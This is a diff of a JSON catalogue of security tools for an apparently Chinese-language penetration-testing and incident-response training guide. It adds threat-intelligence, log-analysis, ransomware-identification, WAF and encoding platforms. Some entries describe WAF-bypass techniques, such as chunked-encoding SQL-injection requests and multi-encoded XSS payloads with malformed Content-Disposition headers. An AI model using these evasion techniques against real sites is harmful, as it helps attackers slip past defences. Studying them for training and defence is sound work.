+                        "downloadUrl": "https://cert.360.cn/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "微步在线威胁情报社区 (X 社区)",
+                        "category": "在线平台 / 威胁情报溯源",
+                        "purpose": "【小白白话通俗理解】国内领先的威胁情报查询平台。输入可疑的外联 IP、域名或文件 Hash，秒级查出该 IP 是否属于黑客控制端 (C2) 或已知挖矿木马！",
+                        "guide": "打开网页输入 IP 或域名即可查看历史攻击标签与信誉评分。",
+                        "downloadUrl": "https://x.threatbook.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -3046,7 +3600,8 @@ Source (不可信输入源)
                         "purpose": "【小白白话通俗理解】让你能直接用 SQL 语句（`SELECT ... FROM access.log`）在数百万行 Web 日志中毫秒级筛选出攻击者 IP、请求方式与被篡改的文件！",
                         "guide": "下载 MSI 安装包安装。在命令行中执行 `LogParser.exe \"SELECT TOP 10 c-ip, COUNT(*) FROM access.log GROUP BY c-ip ORDER BY COUNT(*) DESC\" -i:IISW3C`。",
                         "downloadUrl": "https://www.microsoft.com/en-us/download/details.aspx?id=24659",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "LogParser Lizard (LogParser 图形化可视化客户端)",
@@ -3054,7 +3609,26 @@ Source (不可信输入源)
                         "purpose": "【小白白话通俗理解】LogParser 的可视化版。提供类似 Navicat 的查询界面，并能将日志分析结果一键自动生成饼图、折线图等直观报表！",
                         "guide": "下载安装包安装，内置多种现成的 Web 攻击日志查询模板，点开即用。",
                         "downloadUrl": "http://www.lizard-labs.com/log_parser_lizard.aspx",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "No More Ransom (全球勒索病毒联合解密项目)",
+                        "category": "在线平台 / 公益解密",
+                        "purpose": "【小白白话通俗理解】由欧洲刑警组织、卡巴斯基等多家顶尖安全机构联合发起的公益平台，收集了数百种勒索病毒的免费官方解密工具！",
+                        "guide": "上传勒索信或被加密的文件样本，平台会自动匹配是否存在公开的免费解密工具。",
+                        "downloadUrl": "https://www.nomoreransom.org/zh/index.html",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "奇安信勒索病毒搜索引擎",
+                        "category": "在线平台 / 勒索病毒家族识别",
+                        "purpose": "【小白白话通俗理解】国内领先的勒索病毒样本分析平台。上传被加密文件的后缀或勒索信文本，快速识别勒索病毒家族并提供处置指南。",
+                        "guide": "在搜索框输入勒索信中的联系邮箱或加密后缀即可识别病毒家族。",
+                        "downloadUrl": "https://lesuobingdu.qianxin.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -3110,7 +3684,17 @@ Source (不可信输入源)
                         "purpose": "【小白白话通俗理解】一键把普通请求切成碎片。在 Burp 里只要右键点一下，就能把含有 SQL 注入的请求自动转换为分块传输编码（Chunked），轻松穿透 WAF 防火墙！",
                         "guide": "在 GitHub Releases 下载编译好的 `chunked-coding-converter.jar`，在 Burp Suite 的 `Extensions` ➔ `Installed` ➔ `Add` 中加载使用。",
                         "downloadUrl": "https://github.com/c0ny1/chunked-coding-converter/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "ModSecurity 官方开源 WAF 项目",
+                        "category": "官方网站 / 工业级 WAF 引擎",
+                        "purpose": "【小白白话通俗理解】全球使用最广泛的开源 Web 应用防火墙引擎，OWASP 核心规则集 (CRS) 的基石。",
+                        "guide": "查阅官方 WAF 规则编写语法与防御机制。",
+                        "downloadUrl": "https://github.com/owasp-modsecurity/ModSecurity",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -3170,7 +3754,17 @@ Source (不可信输入源)
                         "purpose": "【小白白话通俗理解】通过在 Content-Disposition 中注入换行与双引号错位，配合 CyberChef 进行多层 HTML 实体与 Hex 编码，彻底破坏 WAF 正则规则。",
                         "guide": "使用 Burp Repeater 手动编辑数据包头与边界符，结合 CyberChef 对 XSS 载荷进行多层编码测试。",
                         "downloadUrl": "https://portswigger.net/burp/communitydownload",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "CyberChef 在线瑞士军刀平台",
+                        "category": "在线平台 / 数据处理",
+                        "purpose": "【小白白话通俗理解】在线直接拖拽执行多层编解码、哈希校验与正则提取的万能平台。",
+                        "guide": "在浏览器打开即用，支持一键保存和分享 Recipe 编解码配方。",
+                        "downloadUrl": "https://gchq.github.io/CyberChef/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -3217,7 +3811,8 @@ WAF 正则库通常基于单行或严格的 RFC 标准格式进行匹配。通�
                         "purpose": "【小白白话通俗理解】涵盖信息收集、WAF 绕过、白盒审计、内网横向与应急排查的全套工业级武器库体系。",
                         "guide": "按照特训班结业大考作战指令书，沉着冷静完成全流程渗透并提取终极 Flag！",
                         "downloadUrl": "https://github.com/YouRanxi/Cybersecurity_Training_Study_Guide",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
